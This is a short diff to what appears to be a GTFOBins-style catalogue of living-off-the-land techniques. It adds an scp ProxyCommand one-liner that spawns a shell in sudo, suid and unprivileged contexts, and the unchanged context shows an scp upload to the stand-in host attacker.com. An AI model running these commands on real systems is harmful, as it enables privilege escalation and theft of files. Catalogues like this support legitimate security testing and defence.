@@ -18,6 +18,13 @@ functions:
       suid:
         shell: true
       unprivileged:
+  - code: |-
+      scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
   upload:
   - code: |-
       scp /path/to/input-file user@attacker.com:/path/to/output-file
